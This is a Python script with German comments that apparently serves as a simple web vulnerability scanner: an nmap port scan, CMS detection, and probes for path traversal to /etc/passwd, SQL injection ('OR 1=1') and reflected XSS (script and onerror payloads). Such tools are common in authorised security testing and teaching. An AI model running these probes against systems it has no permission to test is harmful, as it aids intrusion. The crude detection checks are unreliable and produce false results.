import nmap
import requests
from urllib.parse import urljoin
import re

def scan_ports(target: str, ports: str = "1-1024") -> None:
    """
    Scannt offene Ports auf einem Zielhost mit Nmap.
    :param target: Ziel-Host (IP oder Domain)
    :param ports: Bereich der zu scannenden Ports (Standard: 1-1024)
    """
    nm = nmap.PortScanner()
    print(f"[🔍] Scanne Ports für {target} auf den Ports: {ports}...")

    try:
        nm.scan(target, ports)
        for host in nm.all_hosts():
            print(f"[🌐] Host: {host} ({nm[host].hostname()})")
            for proto in nm[host].all_protocols():
                print(f"  Protokoll: {proto}")
                lport = nm[host][proto].keys()
                for port in lport:
                    state = nm[host][proto][port]["state"]
                    print(f"    Port: {port} - Status: {state}")
    except Exception as e:
        print(f"[⚠️] Fehler beim Scannen von {target}: {e}")

def detect_cms(url: str) -> None:
    """
    Ermittelt das CMS einer Webseite basierend auf Headern und Meta-Tags.
    :param url: URL der zu scannenden Webseite
    """
    try:
        response = requests.get(url)
        cms = None

        # Überprüfen der Header auf bekannte CMS-Bezeichner
        if 'X-Powered-By' in response.headers:
            if 'WordPress' in response.headers['X-Powered-By']:
                cms = 'WordPress'
            elif 'Joomla' in response.headers['X-Powered-By']:
                cms = 'Joomla'
        
        # Überprüfen der Meta-Tags auf CMS-spezifische Informationen
        if not cms and 'content' in response.text:
            if "wp-content" in response.text:
                cms = 'WordPress'
            elif "joomla" in response.text:
                cms = 'Joomla'

        if cms:
            print(f"[📋] Erkanntes CMS: {cms}")
        else:
            print("[⚠️] Kein CMS erkannt.")
    
    except requests.RequestException as e:
        print(f"[⚠️] Fehler beim Abrufen der Webseite: {e}")

def basic_lfi_test(url: str) -> None:
    """
    Testet eine Website auf grundlegende LFI-Schwachstellen.
    :param url: Die zu testende URL
    """
    payloads = [
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "/etc/passwd"
    ]
    for payload in payloads:
        test_url = urljoin(url, payload)
        try:
            response = requests.get(test_url)
            if "root:x" in response.text:
                print(f"[⚠️] LFI-Schwachstelle gefunden bei {test_url}")
        except requests.RequestException:
            pass

def basic_sqli_test(url: str) -> None:
    """
    Testet eine Website auf grundlegende SQLi-Schwachstellen.
    :param url: Die zu testende URL
    """
    payloads = [
        "' OR 1=1 --",
        "' OR 'a'='a' --",
        '" OR "a"="a" --'
    ]
    for payload in payloads:
        test_url = f"{url}?id={payload}"
        try:
            response = requests.get(test_url)
            if "SQL" in response.text or "error" in response.text:
                print(f"[⚠️] SQLi-Schwachstelle gefunden bei {test_url}")
        except requests.RequestException:
            pass

def basic_xss_test(url: str) -> None:
    """
    Testet eine Website auf grundlegende XSS-Schwachstellen.
    :param url: Die zu testende URL
    """
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src='x' onerror='alert(1)'>"
    ]
    for payload in payloads:
        test_url = f"{url}?search={payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                print(f"[⚠️] XSS-Schwachstelle gefunden bei {test_url}")
        except requests.RequestException:
            pass
